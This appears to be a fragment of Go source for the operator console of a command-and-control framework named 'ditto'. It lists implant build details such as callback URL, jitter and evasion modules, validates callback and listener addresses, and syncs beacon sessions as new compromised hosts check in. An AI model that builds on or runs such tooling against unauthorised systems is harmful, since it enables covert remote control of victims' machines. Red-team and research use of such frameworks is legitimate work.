	if len(args) == 0 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: implant <id>\n" +
			"  Use 'implants' command to list all saved implants with their IDs")
	}

	if args[0] == "" {
		return fmt.Errorf("implant ID cannot be empty\n" +
			"  Usage: implant <id>\n" +
			"  Use 'implants' command to list all saved implants with their IDs")
	}

	build, err := database.GetImplantBuildByID(args[0])
	if err != nil {
		return fmt.Errorf("failed to retrieve implant: %w\n"+
			"  Use 'implants' command to list all saved implants with their IDs", err)
	}

	fmt.Printf("[+] Implant Build Details:\n")
	fmt.Printf("    ID: %s\n", build.ID)
	fmt.Printf("    Name: %s\n", build.Name)
	fmt.Printf("    Type: %s\n", build.Type)
	fmt.Printf("    OS: %s\n", build.OS)
	fmt.Printf("    Arch: %s\n", build.Arch)
	fmt.Printf("    Callback URL: %s\n", build.CallbackURL)
	fmt.Printf("    Delay: %d seconds\n", build.Delay)
	fmt.Printf("    Jitter: %.2f\n", build.Jitter)
	fmt.Printf("    User-Agent: %s\n", build.UserAgent)
	fmt.Printf("    Protocol: %s\n", build.Protocol)
	fmt.Printf("    Output Path: %s\n", build.OutputPath)
	fmt.Printf("    Size: %d bytes\n", build.Size)
	fmt.Printf("    Created: %s\n", time.Unix(build.CreatedAt, 0).Format("2006-01-02 15:04:05"))
	if build.Modules != "" {
		fmt.Printf("    Modules: %s\n", build.Modules)
	}
	if build.Evasion != "" {
		fmt.Printf("    Evasion: %s\n", build.Evasion)
	}

	return nil
}

func (is *InteractiveServer) isServerRunning() bool {
	is.serverMu.RLock()
	defer is.serverMu.RUnlock()
	return is.serverRunning
}

func (is *InteractiveServer) setServerRunning(running bool) {
	is.serverMu.Lock()
	defer is.serverMu.Unlock()
	is.serverRunning = running
}

func shortID(id string) string {
	if len(id) <= 8 {
		return id
	}
	return id[:8]
}

// getPrompt returns the prompt string for the current session
func getPrompt(currentSession string) string {
	if currentSession == "" {
		return "[ditto] > "
	}
	return fmt.Sprintf("[ditto %s] > ", shortID(currentSession))
}

// validateCallbackURL validates that a callback URL is in a valid format
func validateCallbackURL(url string) error {
	if url == "" {
		return fmt.Errorf("callback URL cannot be empty")
	}

	// Check if URL has protocol
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		// If no protocol, assume http:// (will be auto-added in generator)
		url = "http://" + url
	}

	// Try to parse as URL
	// We'll do basic validation since net/url might be too strict for our use case
	// Allow formats like: http://host:port, https://host:port, http://host, https://host
	parts := strings.Split(strings.TrimPrefix(strings.TrimPrefix(url, "http://"), "https://"), "/")
	if len(parts) == 0 {
		return fmt.Errorf("invalid URL format\n" +
			"  Expected format: <protocol>://<host>[:<port>]\n" +
			"  Valid protocols: http, https\n" +
			"  Examples: http://192.168.1.100:8443, https://example.com:443")
	}

	hostPort := parts[0]
	if hostPort == "" {
		return fmt.Errorf("host cannot be empty\n" +
			"  Expected format: <protocol>://<host>[:<port>]\n" +
			"  Valid protocols: http, https\n" +
			"  Examples: http://192.168.1.100:8443, https://example.com")
	}

	// Validate host:port format if port is present
	if strings.Contains(hostPort, ":") {
		host, port, err := net.SplitHostPort(hostPort)
		if err != nil {
			return fmt.Errorf("invalid host:port format: %w", err)
		}
		if host == "" {
			return fmt.Errorf("host cannot be empty")
		}
		if port == "" {
			return fmt.Errorf("port cannot be empty")
		}
		portNum, err := strconv.Atoi(port)
		if err != nil {
			return fmt.Errorf("port must be a number: %w", err)
		}
		if portNum < 1 || portNum > 65535 {
			return fmt.Errorf("port must be between 1 and 65535, got %d", portNum)
		}
	}

	return nil
}

// validateAddress validates that an address is in the format host:port
func validateAddress(addr string) error {
	host, port, err := net.SplitHostPort(addr)
	if err != nil {
		return fmt.Errorf("invalid address format: %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 0.0.0.0:8443, 127.0.0.1:8080\n"+
			"  Note: Port is required and must be between 1 and 65535", err)
	}

	if host == "" {
		return fmt.Errorf("host cannot be empty")
	}

	if port == "" {
		return fmt.Errorf("port cannot be empty")
	}

	// Validate port is a number
	portNum, err := strconv.Atoi(port)
	if err != nil {
		return fmt.Errorf("port must be a number: %w", err)
	}

	if portNum < 1 || portNum > 65535 {
		return fmt.Errorf("port must be between 1 and 65535, got %d", portNum)
	}

	return nil
}

// syncSessions periodically syncs sessions from the server
func (is *InteractiveServer) syncSessions() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if !is.isServerRunning() || is.server == nil {
			continue
		}

		// Sync sessions from server to session manager
		serverSessions := is.server.GetSessions()
		for id, serverSession := range serverSessions {
			// Check if session exists
			if existingSession, exists := is.sessionMgr.GetSession(id); exists {
				// Update existing session metadata
				existingSession.UpdateLastSeen()

				// Copy metadata from server session
				if serverSession.Metadata != nil {
					for key, value := range serverSession.Metadata {
						existingSession.SetMetadata(key, value)
					}
				}

				// Update RemoteAddr if changed
				if serverSession.RemoteAddr != "" && existingSession.RemoteAddr != serverSession.RemoteAddr {
					// Note: RemoteAddr isn't directly settable, but we can update via metadata
					existingSession.SetMetadata("remote_addr", serverSession.RemoteAddr)
				}
			} else {
				// Create new session in manager with full metadata
				sessionType := core.SessionTypeBeacon
				if upgraded, ok := serverSession.Metadata["upgraded"].(bool); ok && upgraded {
					sessionType = core.SessionTypeInteractive
				}

				transport := "http"
				if t, ok := serverSession.Metadata["transport"].(string); ok {
					transport = t
				}

				session := core.NewSession(id, sessionType, transport)

				// Copy metadata from server session
				if serverSession.Metadata != nil {
					for key, value := range serverSession.Metadata {
						session.SetMetadata(key, value)
					}
				}

				// Store remote address in metadata (since RemoteAddr isn't directly settable)
				if serverSession.RemoteAddr != "" {
					session.SetMetadata("remote_addr", serverSession.RemoteAddr)
				}

				is.sessionMgr.AddSession(session)

				// Trigger reaction manager for new session
				is.reactionMgr.TriggerEvent(reactions.EventTypeSessionNew, map[string]interface{}{
					"session_id": id,
					"type":       string(sessionType),
					"transport":  transport,
				})
			}
		}
	}
}

// syncSessionsWithContext periodically syncs sessions from the server (with context cancellation)
func (is *InteractiveServer) syncSessionsWithContext(ctx context.Context) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			if !is.isServerRunning() || is.server == nil {
				continue
			}

			// Sync sessions from server to session manager
			serverSessions := is.server.GetSessions()
			for id, serverSession := range serverSessions {
				// Check if session exists
				if existingSession, exists := is.sessionMgr.GetSession(id); exists {
					// Update existing session metadata
					existingSession.UpdateLastSeen()

					// Copy metadata from server session
					if serverSession.Metadata != nil {
						for key, value := range serverSession.Metadata {
							existingSession.SetMetadata(key, value)
						}
					}

					// Update RemoteAddr if changed
					if serverSession.RemoteAddr != "" && existingSession.RemoteAddr != serverSession.RemoteAddr {
						// Note: RemoteAddr isn't directly settable, but we can update via metadata
						existingSession.SetMetadata("remote_addr", serverSession.RemoteAddr)
					}
				} else {
					// Create new session in manager with full metadata
					sessionType := core.SessionTypeBeacon
					if upgraded, ok := serverSession.Metadata["upgraded"].(bool); ok && upgraded {
						sessionType = core.SessionTypeInteractive
					}

					transport := "http"
					if t, ok := serverSession.Metadata["transport"].(string); ok {
						transport = t
					}

					session := core.NewSession(id, sessionType, transport)
					
					// Set RemoteAddr if available - need to use reflection or direct field access
					// Since RemoteAddr is a field, we can use a helper method
					if serverSession.RemoteAddr != "" {
						// Store in metadata for now, we'll enhance Session struct later if needed
						session.SetMetadata("remote_addr", serverSession.RemoteAddr)
					}
					
					// Copy metadata from server session
					if serverSession.Metadata != nil {
						for key, value := range serverSession.Metadata {
							session.SetMetadata(key, value)
						}
					}

					is.sessionMgr.AddSession(session)

					// Print notification about new session (without interrupting prompt)
					// Use fmt.Printf with newline to ensure it appears properly
					fmt.Printf("\n[+] New session: %s (%s) from %s\n", shortID(id), sessionType, serverSession.RemoteAddr)
					if is.input != nil {
						is.input.SetPrompt(getPrompt(is.currentSession))
					}

					// Trigger reaction manager for new session
					is.reactionMgr.TriggerEvent(reactions.EventTypeSessionNew, map[string]interface{}{
						"session_id": id,
						"type":       string(sessionType),
						"transport":  transport,
					})
				}
			}
		}
	}
}
